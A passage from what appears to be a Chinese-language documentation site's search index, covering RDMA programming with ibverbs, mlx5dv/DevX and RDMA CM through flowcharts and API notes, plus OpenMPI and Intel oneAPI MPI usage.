n7@{ shape: \"fr-rect\", label: \"mr_flags&lt;br/&gt;=IBV_ACCESS_REMOTE_READ|...\" } --- n8\n n1 --- n8@{ shape: \"rounded\", label: \"ibv_reg_mr()\" }\n n9@{ shape: \"hex\", label: \"ibv_qp_init_attr\" }\n n10@{ shape: \"hex\", label: \"ibv_cq\" }\n n6 --- n10\n n9@{ shape: \"hex\", label: \"ibv_qp_init_attr\" }\n n10 ---|\"send_cq, recv_cq\"| n9\n n11@{ shape: \"fr-rect\", label: \"qp_type&lt;br/&gt;=IBV_QPT_RC\" }\n n11 --- n9\n n12@{ shape: \"rounded\", label: \"ibv_create_qp()\" }\n n9 --- n12\n n13@{ shape: \"hex\", label: \"ibv_qp\" }\n n12 --- n13\n end\n n15 --- n14@{ shape: \"hex\", label: \"ibv_device **\" }\n n14 --- n16\n n16 --- n17\n n14 --- n5\n subgraph s2[\"connect_qp()\"]\n  n36@{ shape: \"rounded\", label: \"sock_sync_data()\" }\n  subgraph s3[\"cm_con_data_t\"]\n   n24@{ shape: \"hex\", label: \"buf\" }\n   n23@{ shape: \"hex\", label: \"lid\" }\n   n22@{ shape: \"hex\", label: \"qp_num\" }\n   n20@{ shape: \"hex\", label: \"rkey\" }\n   n21@{ shape: \"hex\", label: \"gid\" }\n  end\n  n18@{ shape: \"hex\", label: \"ibv_gid\" }\n  n19@{ shape: \"rounded\", label: \"ibv_query_gid()\" }\n end\n n3 --- n19\n n19 --- n18\n n18 --- n21\n n8 --- n25\n n25 --- n20\n n4 --- n24\n n13 --- n22\n n27 --- n26\n n3 --- n27\n n26 --- n23\n n29 --- n30\n n13 --- n30\n n28 --- n29\n subgraph s5[\"post_receive()\"]\n  n33@{ shape: \"rounded\", label: \"ibv_post_recv\" }\n  n32@{ shape: \"hex\", label: \"ibv_recv_wr\" }\n  n31@{ shape: \"hex\", label: \"ibv_sge\" }\n end\n n25 ---|\"lkey\"| n31\n n4 --- n31\n subgraph s4[\"modify_qp_to_init, rts()\"]\n  n28@{ shape: \"fr-rect\", label: \"qp_state&lt;br/&gt;=IBV_QPS_INIT\" }\n  n30@{ shape: \"rounded\", label: \"ibv_modify_qp()\" }\n  n29@{ shape: \"hex\", label: \"ibv_qp_attr\" }\n end\n n31 --- n32\n n32 --- n33\n subgraph s6[\"modify_qp_to_rtr()\"]\n  n34@{ shape: \"rounded\", label: \"Rounded Rectangle\" }\n  n35@{ shape: \"hex\", label: \"ibv_qp_attr\" }\n end\n n22 --- n35\n n23 --- n35\n n35 --- n34@{ shape: \"rounded\", label: \"ibv_modify_qp()\" }\n s3 --- n36</code></pre> <p>\u901a\u4fe1\u9636\u6bb5\uff1a</p> <ul> <li><code>post_send()</code>\uff1a\u521b\u5efa\u5e76\u53d1\u9001 WR\uff0cWR \u7684\u7c7b\u578b\u53d6\u51b3\u4e8e <code>opcode</code>\u3002</li> <li><code>poll_completion()</code>\uff1a\u8f6e\u8be2\u5f97\u5230 WC\u3002</li> </ul> <pre><code>flowchart TD\n subgraph s1[\"post_send()\"]\n  n12@{ shape: \"rounded\", label: \"ibv_post_send()\" }\n  n7@{ shape: \"fr-rect\", label: \".opcode&lt;br/&gt;IBV_WR_SEND&lt;br/&gt;IBV_WR_RDMA_READ&lt;br/&gt;IBV_WR_RDMA_WRITE\" }\n  n1@{ shape: \"hex\", label: \"ibv_sge\" }\n  n2@{ shape: \"hex\", label: \"ibv_send_wr\" }\n end\n n3@{ shape: \"hex\", label: \"ibv_mr\" }\n n3 ---|\".lkey\"| n1\n n4@{ shape: \"hex\", label: \"buf\" }\n n4 --- n1\n n1 --- n2\n subgraph s2[\"IBV_WR_SEND only\"]\n  n5@{ shape: \"hex\", label: \".rkey\" }\n  n6@{ shape: \"hex\", label: \".remote_addr\" }\n end\n s2 ---|\".wr.rdma\"| n2\n n7 --- n2\n subgraph s3[\"poll_completion()\"]\n  n11@{ shape: \"rounded\", label: \"assert()\" }\n  n10@{ shape: \"rounded\", label: \"ibv_poll_cq()\" }\n  n9@{ shape: \"hex\", label: \"ibv_wc\" }\n end\n n8@{ shape: \"hex\", label: \"ibv_cq\" }\n n9 --- n10\n n8 --- n10\n n10 ---|\".status == IBV_WC_SUCCESS\"| n11\n n2 --- n12</code></pre> <p>\u8be5\u7a0b\u5e8f\u6f14\u793a\u4e86\u4e0b\u9762\u7684\u64cd\u4f5c\uff1a</p> <ul> <li><code>resource_create()</code>\uff1a\u670d\u52a1\u7aef\u628a <code>SEND operation</code> \u5b57\u7b26\u4e32\u653e\u5728\u7f13\u51b2\u533a <code>res-&gt;buf</code> \u4e2d\u3002</li> <li><code>connect_qp()</code>\uff1a\u4ea4\u6362\u8d44\u6e90\u4fe1\u606f\uff0c\u8fdc\u7aef\u4fe1\u606f\u653e\u5165 <code>res-&gt;remote_props</code>\u3002\u4ea4\u6362\u5185\u5bb9\u5305\u62ec <code>res-&gt;buf</code> \u7684\u5730\u5740\u3002Client \u5411 Server \u53d1\u9001\u4e00\u4e2a Receive\u3002</li> <li><code>post_send()</code>\uff1aServer \u53d1\u9001\u4e00\u4e2a Send\u3002\u8be5 WR \u7684\u6784\u6210\uff1a<ul> <li><code>.sg_list-&gt;addr</code> \u4e3a <code>res-&gt;buf</code>\uff0c\u5373 Server \u7684\u7f13\u51b2\u533a\u5730\u5740\u3002</li> <li><code>.wr.rdma.remote_addr</code> \u4e3a <code>res-&gt;remote_props.addr</code>\uff0c\u5373 Client \u7684\u7f13\u51b2\u533a\u5730\u5740\u3002</li> </ul> </li> <li><code>poll_completion()</code>\uff1aClient \u6536\u5230\u5e76\u663e\u793a\u4fe1\u606f <code>SEND operation</code>\u3002</li> <li>Server \u518d\u5c06\u7f13\u51b2\u533a\u5185\u5bb9\u4fee\u6539\u4e3a <code>RDMA read operation</code>\u3002</li> <li><code>post_send()</code>\uff1aClient \u53d1\u9001\u4e00\u4e2a read \u64cd\u4f5c\uff0c\u8bfb\u53d6\u5230 <code>RDMA read operation</code>\u3002\u56e0\u4e3a\u8fd9\u662f\u5355\u8fb9\u64cd\u4f5c\uff0cServer \u4e0d\u4f1a\u77e5\u9053\u3002</li> <li>Client \u5c06\u7f13\u51b2\u533a\u5185\u5bb9\u4fee\u6539\u4e3a <code>RDMA write operation</code>\u3002</li> <li><code>post_send()</code>\uff1aClient \u53d1\u9001\u4e00\u4e2a write \u64cd\u4f5c\uff0c\u5199\u5165\u5230 Server \u7684\u7f13\u51b2\u533a\u3002</li> <li>Server \u6253\u5370\u7f13\u51b2\u533a\u5185\u5bb9\uff0c\u4e3a <code>RDMA write operation</code>\u3002</li> </ul>"},{"location":"optimization/HPN/%E7%BC%96%E7%A8%8B/ibverbs/#srq","title":"SRQ","text":"<p>SRQ \u4f5c\u4e3a <code>struct ibv_qp_init_attr</code> \u4e2d\u7684\u4e00\u4e2a\u53ef\u9009\u5b57\u6bb5\u3002</p>"},{"location":"optimization/HPN/%E7%BC%96%E7%A8%8B/ibverbs/#ibv_wr_","title":"<code>ibv_wr_*</code>","text":""},{"location":"optimization/HPN/%E7%BC%96%E7%A8%8B/ibverbs/#_ex","title":"<code>*_ex</code>","text":""},{"location":"optimization/HPN/%E7%BC%96%E7%A8%8B/mlx5dv/","title":"mlx5dv \u4e0e DevX","text":""},{"location":"optimization/HPN/%E7%BC%96%E7%A8%8B/mlx5dv/#mlx5dv-\u4e0e-devx","title":"<code>mlx5dv</code> \u4e0e DevX","text":"<p>Quote</p> <ul> <li>Mellanox/devx</li> <li>mlx5dv(7) \u2014 libibverbs-dev \u2014 Debian testing \u2014 Debian Manpages</li> <li>rdma-core/providers/mlx5/man at master \u00b7 linux-rdma/rdma-core</li> </ul> <ul> <li>\u5934\u6587\u4ef6\uff1a<code>infiniband/mlx5dv.h</code></li> <li>API \u524d\u7f00\uff1a<code>mlx5dv_</code></li> </ul> <p><code>mlx5dv</code>\uff08Direct Verbs\uff09API \u652f\u6301\u4ece\u7528\u6237\u7a7a\u95f4\u76f4\u63a5\u8bbf\u95ee mlx5 \u9a71\u52a8\u8bbe\u5907\u7684\u8d44\u6e90\uff0c\u7ed5\u8fc7 <code>libibverbs</code> \u7684\u6570\u636e\u901a\u8def\uff0c\u76f4\u63a5\u66b4\u9732\u4f4e\u7ea7\u522b\u7684\u6570\u636e\u901a\u8def\u3002</p> <p>\u517c\u5bb9\u6027</p> <p>\u4ece Connect-IB \u5f00\u59cb\u7684\u6240\u6709 Mellanox \u7f51\u5361\u8bbe\u5907\uff08\u5305\u62ec Connect-IB\u3001ConnectX-4\u3001ConnectX-4Lx\u3001ConnectX-5 \u7b49\uff09\u90fd\u5b9e\u73b0\u4e86 mlx5 API\u3002</p> <p>DevX API \u7591\u4f3c\u662f Mellanox \u5f00\u53d1\u7684 <code>mlx5dv</code> \u7684\u524d\u8eab\uff0c\u5176\u4ed3\u5e93\u4e0a\u6b21\u66f4\u65b0\u65f6\u95f4\u4e3a 2018 \u5e74\uff0c\u5f53\u5e74 <code>mlx5dv</code> \u4e5f\u5e76\u5165\u4e86 <code>rdma-core</code>\u3002\u73b0\u5728 DevX \u6210\u4e3a\u4e86 <code>mlx5dv</code> \u7684\u4e00\u90e8\u5206\u3002</p> <p>\u8fd9\u90e8\u5206\u7684\u6587\u6863\u5c11\u5f97\u53ef\u601c\u3002\u76ee\u524d\u4ec5\u6709\u7684\u6587\u6863\u6765\u81ea <code>rdma-core/providers/mlx5/man</code> \u7684 mlx5 Programmer's Manual\u3002\u6211\u4eec\u5148\u5bf9 DevX API \u7684\u5404\u4e2a\u90e8\u5206\u5efa\u7acb\u5927\u6982\u7684\u5370\u8c61\uff1a</p> <ul> <li> <p>DevX\uff08\u89c1 <code>mlx5dv_devx_obj_create</code>\uff09\uff1a\u76ee\u6807\u662f\u4f7f\u7528\u6237\u7a7a\u95f4\u9a71\u52a8\u7a0b\u5e8f\u5c3d\u53ef\u80fd\u72ec\u7acb\u4e8e\u5185\u6838\u3002\u5f53\u8bbe\u5907\u63d0\u4f9b\u65b0\u7684\u529f\u80fd\u548c\u547d\u4ee4\u65f6\uff0c\u4e0d\u9700\u8981\u5185\u6838\u66f4\u6539\u5c31\u80fd\u4f7f\u7528\u3002</p> <ul> <li>DEVX \u5bf9\u8c61\u4ee3\u8868\u5e95\u5c42\u7684\u56fa\u4ef6\u5bf9\u8c61\u3002</li> <li>\u521b\u5efa DEVX \u5bf9\u8c61\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>mlx5dv_devx</code> API \u8fdb\u884c\u67e5\u8be2\u3001\u4fee\u6539\u6216\u9500\u6bc1\u3002</li> </ul> <p>\u8fd9\u4e00\u90e8\u5206\u7684\u6570\u636e\u7ed3\u6784\u90fd\u662f\u56fa\u4ef6\u76f8\u5173\u7684\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u7f16\u7a0b\u65f6\u91c7\u7528\u5927\u91cf\u5b8f\u5b9a\u4e49\u548c\u4f4d\u64cd\u4f5c\u3002\u9700\u8981\u4ed4\u7ec6\u67e5\u770b\u5177\u4f53\u7684\u8bbe\u5907\u6587\u6863\u3002</p> </li> <li> <p>Direct Rule\uff08\u89c1 <code>mlx5dv_dr_flow</code>\uff09\uff1a\u8ba9\u5e94\u7528\u7a0b\u5e8f\u76f4\u63a5\u63a7\u5236\u8bbe\u5907\u7684\u6240\u6709\u5305\u8f6c\u53d1\uff08packet steering\uff09\u529f\u80fd\uff0c\u5b9a\u4e49\u590d\u6742\u7684\u6d41\u8868\u89c4\u5219\uff0c\u5305\u62ec\u8ba1\u6570\u3001\u5c01\u88c5\u3001\u89e3\u5c01\u88c5\u7b49\u3002</p> </li> </ul>"},{"location":"optimization/HPN/%E7%BC%96%E7%A8%8B/mlx5dv/#dma-\u793a\u4f8b","title":"DMA \u793a\u4f8b","text":"<p>\u4f7f\u7528 <code>mlx5dv</code> API \u6267\u884c DMA \u62f7\u8d1d\uff1a</p> <ul> <li>Host\uff1a<ul> <li>\u7528 IB Verb \u521b\u5efa\u8bbe\u5907\u4e0a\u4e0b\u6587\u3001PD</li> <li>\u4f7f\u7528 <code>mlx5dv_devx_umem_reg()</code> \u6ce8\u518c\u7528\u6237 DMA \u5185\u5b58\uff0c\u83b7\u5f97\u4e00\u4e2a <code>struct mlx5dv_devx_umem</code>\u3002</li> <li>\u4f7f\u7528 <code>MLX5_CMD_OP_CREATE_MKEY</code> \u8c03\u7528 <code>mlx5dv_devx_obj_create()</code> \u83b7\u5f97 MKEY\u3002</li> <li>\u4f7f\u7528 <code>mlx5dv_devx_general_cmd()</code> \u6267\u884c <code>MLX5_CMD_OP_ALLOW_OTHER_VHCA_ACCESS</code>\uff0c\u5141\u8bb8\u5176\u4ed6 VHCA \u8bbf\u95ee\u5185\u5b58\u3002</li> </ul> </li> <li>Device\uff1a<ul> <li>\u7528 IB Verb \u521b\u5efa\u8bbe\u5907\u4e0a\u4e0b\u6587\u3001PD \u548c MR\u3002</li> <li>\u4ece Host \u83b7\u53d6\u76f8\u5173\u6570\u636e</li> <li>\u4f7f\u7528 <code>MLX5_CMD_OP_CREATE_GENERAL_OBJECT</code> \u548c <code>MLX5_GENERAL_OBJ_TYPE_MKEY</code> \u8c03\u7528<code>mlx5dv_devx_obj_create()</code> \u521b\u5efa MR \u522b\u540d\u3002</li> </ul> </li> </ul>"},{"location":"optimization/HPN/%E7%BC%96%E7%A8%8B/rdmacm/","title":"RDMA CM","text":""},{"location":"optimization/HPN/%E7%BC%96%E7%A8%8B/rdmacm/#rdma-cm","title":"RDMA CM","text":"<p>Quote</p> <ul> <li>RDMA Aware Networks Programming User Manual - NVIDIA Docs\uff1a\u5305\u542b RDMA \u67b6\u6784\u6982\u8ff0\u548c IB Verbs\u3001RDMACM \u7684 API \u6587\u6863\u3002\u8be5\u6587\u6863\u7b2c\u516b\u7ae0\u5305\u542b\u4e86\u5404\u5c42\u6b21 API \u7f16\u7a0b\u7684\u4f8b\u5b50\uff0c\u5177\u6709\u6bd4\u8f83\u8be6\u7ec6\u7684\u6ce8\u91ca\uff0c\u9002\u5408\u521d\u5b66\u8005\u5b66\u4e60\u3002\u672c\u6587\u4e2d\u7684\u90e8\u5206\u7f16\u7a0b\u793a\u4f8b\u6765\u81ea\u8be5\u624b\u518c\u3002</li> </ul> <ul> <li>\u5934\u6587\u4ef6\uff1a<code>rdma/rdma_cma.h</code>\u3001<code>rdma_verbs.h</code></li> <li>API \u524d\u7f00\uff1a<code>rdma_</code></li> <li>\u8f6f\u4ef6\u5305\u540d\uff1a<code>librdmacm-dev</code></li> </ul> <p>librdmacm \u63d0\u4f9b\u6bd4 IB Verbs \u62bd\u8c61\u5c42\u6b21\u66f4\u9ad8\u7684\u53e6\u4e00\u5957 API\uff1a</p> <ul> <li> <p>Connection Manager\uff0c\u8d1f\u8d23\u7ba1\u7406 RDMA \u8fde\u63a5\u3002\u5b83\u5305\u88c5\u4e86\u4ea4\u6362 QP\u3001Key \u7b49\u4fe1\u606f\u7684\u8fc7\u7a0b\uff0c\u51cf\u5c11\u4e86\u4ee3\u7801\u91cf\uff0c\u8ba9 RDMA \u7f16\u7a0b\u66f4\u52a0\u7b80\u5355\u3002\u5b83\u7684\u63a5\u53e3\u4e0e Socket \u6bd4\u8f83\u7c7b\u4f3c\uff1a</p> <pre><code>rdma_listen()\nrdma_connect()\nrdma_accept()\n</code></pre> </li> <li> <p>RDMA Verbs\uff0c\u672c\u8d28\u4e0a\u662f\u5efa\u7acb\u5728 libibverbs \u4e0a\u7684\u4e00\u5c42\u5305\u88c5\u3002</p> </li> </ul> <p>\u4ee5 SRQ \u7684\u521b\u5efa\u4e3a\u4f8b\uff0c\u6211\u4eec\u770b\u770b\u5177\u4f53\u7684\u5305\u88c5\u8fc7\u7a0b\uff1a</p> librdmacm/cma.c<pre><code>int rdma_create_srq(struct rdma_cm_id *id, struct ibv_pd *pd,\n    struct ibv_srq_init_attr *attr) {\n    ret = rdma_create_srq_ex(id, &amp;attr_ex);\n}\nint rdma_create_srq_ex(struct rdma_cm_id *id, struct ibv_srq_init_attr_ex *attr) {\n    struct ibv_srq *srq;\n    srq = ibv_create_srq_ex(id-&gt;verbs, attr);\n}\n</code></pre>"},{"location":"optimization/HPN/%E7%BC%96%E7%A8%8B/rdmacm/#\u4f8b\u7a0b","title":"\u4f8b\u7a0b","text":"<p>\u4ee3\u7801\u89c1 <code>mckey.c</code>\u3002</p> <p>RDMA_CM \u7528\u4e8e\u7ba1\u7406 RDMA \u8fde\u63a5\uff0c\u5305\u88c5\u4e86\u4f7f\u7528 socket \u7f16\u7a0b\u4ea4\u6362 QP\u3001R_Key \u7b49\u4fe1\u606f\u7684\u8fc7\u7a0b\uff0c\u51cf\u5c11\u4ee3\u7801\u91cf\u3002\u5b83\u7684\u63a5\u53e3\u4e0e Socket \u7c7b\u4f3c\uff1a</p> <p>\u4e0e Socket \u7f16\u7a0b\u7684\u6bd4\u8f83\uff1a</p> <ul> <li>\u64cd\u4f5c\u5f02\u6b65\u8fdb\u884c\uff0c\u901a\u8fc7 <code>rdma_event_channel</code> \u8fdb\u884c\u4e8b\u4ef6\u901a\u77e5\u3002</li> <li><code>rdma_cm_id</code>\uff08identifier\uff09\u4e0e <code>fd</code> \u7c7b\u4f3c\uff0c\u7528\u4e8e\u6807\u8bc6\u8fde\u63a5\u3002</li> <li>\u4f7f\u7528 <code>rdma_bind_addr()</code> \u5c06 <code>rdma_cm_id</code> \u4e0e <code>sockaddr</code> \u7ed1\u5b9a\uff0c\u7c7b\u4f3c <code>bind()</code>\u3002</li> </ul> <p>\u672c\u4f8b\u4e3a\u591a\u64ad\u901a\u4fe1\uff0c\u9700\u8981\u4f7f\u7528 <code>rdma_join_multicast()</code> \u548c <code>rdma_leave_multicast()</code> \u8fdb\u51fa\u591a\u64ad\u7ec4\u3002</p> <pre><code>flowchart TD\n subgraph s1[\"run()\"]\n  subgraph s2[\"connect_evnets() [LOOP]\"]\n   subgraph s5[\"join_handler()\"]\n    n14@{ shape: \"rounded\", label: \"ibv_create_ah()\" }\n    n15@{ shape: \"rounded\", label: \"inet_ntop()\" }\n   end\n   subgraph s4[\"addr_handler()\"]\n    n12@{ shape: \"rounded\", label: \"rdma_join_multicast()\" }\n    n13@{ shape: \"rounded\", label: \"ibv_post_recv()\" }\n   end\n   subgraph s3[\"cma_handler()\"]\n   end\n   n9@{ shape: \"rounded\", label: \"rdma_ack_cm_evnet()\" }\n   n11@{ shape: \"rounded\", label: \"rdma_get_cm_event()\" }\n   n10@{ shape: \"hex\", label: \"rdma_cm_event\" }\n  end\n  n8@{ shape: \"rounded\", label: \"rdma_bind_addr()\" }\n  n7@{ shape: \"hex\", label: \"char *\" }\n  n6@{ shape: \"rounded\", label: \"getaddrinfo()\" }\n  n5@{ shape: \"hex\", label: \"sockaddr\" }\n  n2@{ shape: \"rounded\", label: \"rdma_create_id()\" }\n  n1@{ shape: \"hex\", label: \"rdma_cm_id\" }\n end\n n3@{ shape: \"hex\", label: \"rdma_event_channel\" }\n n4@{ shape: \"rounded\", label: \"rdma_create_event_channel\" }\n n4@{ shape: \"rounded\", label: \"rdma_create_event_channel()\" } --- n3\n n3 --- n2\n n2 --- n1\n n6 --- n5\n n7 --- n6\n n5 ---|\"src_addr\"| n8\n n1 --- n8\n n11 --- n10\n n10 --- n9\n s3 --- s4\n s3 --- s5\n n10 --- s3\n n3 --- n11\n n1 --- s3\n n16@{ shape: \"rounded\", label: \"rdma_leave_multicast()\" }\n n1 --- n16\n n5 ---|\"dst_addr\"| n12\n n12 --- n16</code></pre>"},{"location":"optimization/parallel/","title":"\u5e76\u884c\u8ba1\u7b97","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/#\u5e76\u884c\u8ba1\u7b97","title":"\u5e76\u884c\u8ba1\u7b97","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/model/","title":"\u6a21\u578b","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/model/#\u6a21\u578b","title":"\u6a21\u578b","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/model/#\u7ebf\u7a0b\u4e0e\u8fdb\u7a0b","title":"\u7ebf\u7a0b\u4e0e\u8fdb\u7a0b","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/model/#numa-\u67b6\u6784","title":"NUMA \u67b6\u6784","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/","title":"MPI","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#mpi","title":"MPI","text":"<p>Abstract</p> <p>\u672c\u6587\u6863\u524d\u534a\u90e8\u5206\u5c06\u4ecb\u7ecd\u4e0e\u5177\u4f53\u5b9e\u73b0\u65e0\u5173\u7684 MPI \u77e5\u8bc6\uff0c\u540e\u534a\u90e8\u5206\u5c06\u4ecb\u7ecd OpenMPI\u3001MPICHv2\u3001oneAPI\u3001HPC-X \u7b49\u5177\u4f53\u5b9e\u73b0\u7684\u67b6\u6784\u548c\u7279\u70b9\u3002\u6700\u540e\u6d89\u7565\u4e00\u4e9b MPI \u9ad8\u7ea7\u8bdd\u9898\u3002</p> <ul> <li>\u4e86\u89e3 MPI \u5b9e\u73b0\u3001\u901a\u4fe1\u7b97\u6cd5\u4e4b\u95f4\u7684\u5dee\u5f02\uff0c\u6709\u4f9d\u636e\u6709\u7b56\u7565\u5730\u8fdb\u884c\u8c03\u4f18\u3002</li> <li>\u4e86\u89e3\u4e0d\u540c MPI \u5b9e\u73b0\u7684\u4f9d\u8d56\u94fe\u548c\u5de5\u4f5c\u65b9\u5f0f\uff0c\u4ee5\u4fbf\u5728\u9047\u5230\u9519\u8bef\u65f6\u5feb\u901f\u8bca\u65ad\u548c\u4fee\u590d\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#mpi-\u5b9e\u73b0","title":"MPI \u5b9e\u73b0","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#openmpi","title":"OpenMPI","text":"<p>Quote</p> <ul> <li>Open MPI: Videos: General information\uff1a\u8be5\u7cfb\u5217\u89c6\u9891\u4ecb\u7ecd\u4e86 Open MPI \u7684\u6574\u4f53\u7ed3\u6784\uff0c\u5bf9\u5404\u6a21\u5757\u5982 PMI\u3001UCX \u7b49\u4f5c\u4e86\u7b80\u5355\u4ecb\u7ecd\u3002</li> <li>Open MPI Developer's Workshop (2006)</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#openmpi-\u67b6\u6784","title":"OpenMPI \u67b6\u6784","text":"<p>OpenMPI \u91c7\u7528 MCA\uff08Modular Component Architecture\uff09\u7684\u6a21\u5757\u5316\u65b9\u5f0f\u642d\u5efa\uff0c\u67b6\u6784\u5982\u4e0b\uff1a</p> <p></p> <ul> <li> <p>PMIx\uff08Process Management Interface\uff09\uff1a\u7528\u4e8e\u4e0e <code>slurm</code> \u8fd9\u6837\u7684\u8d44\u6e90\u7ba1\u7406\u5668\uff08Resource Manager\uff0cRM\uff09\u6c9f\u901a\u3002\u56e0\u4e3a PMI \u7684\u5b58\u5728\uff0c\u6211\u4eec\u80fd\u591f\u76f4\u63a5\u4f7f\u7528 <code>srun</code> \u8fd0\u884c OpenMPI \u7a0b\u5e8f\uff0c\u53d6\u5f97\u4e0e <code>mpirun</code> \u7b49\u6548\u7684\u6548\u679c\u3002</p> <p>MPI \u4e0e\u8d44\u6e90\u7ba1\u7406\u5668\u53ef\u4ee5\u901a\u8fc7\u4e09\u79cd\u65b9\u5f0f\u4ea4\u4e92\uff1a</p> <ul> <li>Slurm \u542f\u52a8 MPI \u5e76\u884c\u7a0b\u5e8f\uff0c\u5e76\u901a\u8fc7 PMI API\uff08Process Management Interface\uff09\u8c03\u7528\u6267\u884c\u521d\u59cb\u5316\u3002</li> <li>Slurm \u5206\u914d\u8d44\u6e90\uff0c\u7136\u540e\u7531 <code>mpirun</code> \u57fa\u4e8e Slurm \u7684\u57fa\u7840\u8bbe\u65bd\u542f\u52a8\u5e76\u884c\u7a0b\u5e8f\u3002<code>srun</code> \u5c31\u662f\u8fd9\u79cd\u65b9\u5f0f\u3002</li> <li>Slurm \u5206\u914d\u8d44\u6e90\uff0c\u7136\u540e\u7531 <code>mpirun</code> \u901a\u8fc7 SSH \u7b49\u5176\u4ed6\u673a\u5236\u542f\u52a8\u5e76\u884c\u7a0b\u5e8f\u3002\u8fd9\u79cd\u65b9\u5f0f\u4e0b\uff0cSlurm \u65e0\u6cd5\u8fdb\u884c\u8d44\u6e90\u7ba1\u63a7\u548c\u8ffd\u8e2a\u3002</li> </ul> <p>\u53ef\u4ee5\u9605\u8bfb Slurm: PMIx - Exascale Process Management Interface \u4e86\u89e3\u66f4\u591a\u3002</p> </li> <li> <p>\u7f51\u7edc\u652f\u6301\u6a21\u5757\uff1aOpenMPI \u652f\u6301 BTL\u3001MTL\u3001UCX \u7b49\u7f51\u7edc\u6a21\u5757\u3002</p> <ul> <li>UCX\uff1a\u5982\u679c InfiniBand \u8bbe\u5907\u53ef\u7528\uff0cOpenMPI \u5c06\u9009\u7528 <code>UCX</code> \u6a21\u5757\u3002</li> <li>OpenFabric\uff1aIntel \u8bbe\u5907\u4e00\u822c\u9009\u62e9\u91c7\u7528 <code>libfabric</code>\u3002</li> <li>OpenMPI \u540c\u6837\u4e3a CUDA GDR\uff08GPUDirect RDMA\uff09\u7b49\u53ef\u9009\u6a21\u5757\u63d0\u4f9b\u4e86\u652f\u6301\uff0c\u5728\u7f16\u8bd1 <code>./configure</code> \u65f6\u63d0\u4f9b CUDA \u4f4d\u7f6e\u5373\u53ef\u3002\u5173\u4e8e OpenMPI \u7684\u7f16\u8bd1\u4e0e\u6784\u5efa\uff0c\u8bf7\u67e5\u9605\u53c2\u8003\u8d44\u6599\u4e2d EasyBuild \u7684\u8bb2\u5ea7\u3002</li> </ul> </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#openmpi-\u4f7f\u7528","title":"OpenMPI \u4f7f\u7528","text":"<ul> <li>\u67e5\u770b\u4fe1\u606f\uff1a<code>ompi_info --all</code></li> <li><code>mpirun</code> <code>mpiexec</code> <code>orterun</code> \u662f\u540c\u4e00\u4e2a\u547d\u4ee4\u3002</li> </ul> <p>OpenMPI \u4f7f\u7528 Slot \u4f5c\u4e3a\u8d44\u6e90\u5206\u914d\u5355\u4f4d\uff0c\u6709\u591a\u5c11\u4e2a Slot \u5c31\u53ef\u4ee5\u8fd0\u884c\u591a\u5c11\u4e2a\u8fdb\u7a0b\u3002</p> <ul> <li>\u9ed8\u8ba4\uff1a\u5904\u7406\u5668\u6838\u6570\u3002</li> <li>\u4f7f\u7528\u8d85\u7ebf\u7a0b\u6838\u5fc3\u6570\uff1a\u7528 <code>--use-hwthread-cpus</code> \u5f00\u542f\uff0c\u5e38\u89c1\u4e3a 2 \u500d\u5904\u7406\u5668\u6838\u6570\u3002\u53ef\u4ee5\u5728 <code>lscpu</code> \u4e2d\u7684 <code>Thread(s) per core</code> \u67e5\u770b\u3002</li> <li>\u8d44\u6e90\u7ba1\u7406\u5668\u8c03\u5ea6\uff1a\u4ece\u8d44\u6e90\u7ba1\u7406\u5668\u83b7\u53d6 Slot \u6570\u3002</li> <li>\u9700\u8981\u6ce8\u610f\uff1aSlot \u6570\u548c\u786c\u4ef6\u6ca1\u6709\u5173\u7cfb\uff0c\u53ef\u80fd\u6bd4\u786c\u4ef6\u6838\u6570\u591a\uff0c\u4e5f\u53ef\u80fd\u6bd4\u786c\u4ef6\u6838\u6570\u5c11\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#mvapich2","title":"MVAPICH2","text":"<p>Quote</p> <ul> <li>The MVAPICH2 Project Latest Status and Future Plans\uff1a\u5728 SC 21 \u8fdb\u884c\u7684\u4e00\u6b21\u62a5\u544a\uff0c\u4ecb\u7ecd\u4e86 MVAPICH2 \u7684\u6700\u65b0\u8fdb\u5c55\u548c\u672a\u6765\u8ba1\u5212\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#mvapich2-benchmark","title":"MVAPICH2 Benchmark","text":"<p>Quote</p> <ul> <li>Benchmarks - MVAPICH</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#oneapi","title":"oneAPI","text":"<p>Quote</p> <ul> <li>Intel MPI Library</li> <li>Get Started</li> <li>Developer Guides</li> <li>Developer References</li> <li>How to set up IntelMPI over RoCEv2 - HPC-Works - Confluence</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#oneapi-\u4f7f\u7528","title":"oneAPI \u4f7f\u7528","text":"<ol> <li> <p>\u52a0\u8f7d\u73af\u5883</p> <pre><code>source /opt/intel/oneapi/setvars.sh\n</code></pre> </li> <li> <p>\u521b\u5efa <code>hostfile</code>\uff0c\u6bcf\u884c\u4e00\u4e2a\u8282\u70b9\u540d\uff1a</p> <pre><code>clusternode1\nclusternode2\n</code></pre> </li> <li> <p>\u6784\u5efa\u3001\u7f16\u8bd1</p> </li> <li> <p>\u8fd0\u884c</p> <pre><code>mpirun -n &lt;# of processes&gt; -ppn &lt;# of processes per node&gt; -f &lt;# position of hostfile&gt; ./myprog\n</code></pre> </li> </ol> <p>\u5bf9 Intel MPI \u6765\u8bf4\uff0c<code>mpirun</code> \u662f <code>mpiexec.hydra</code> 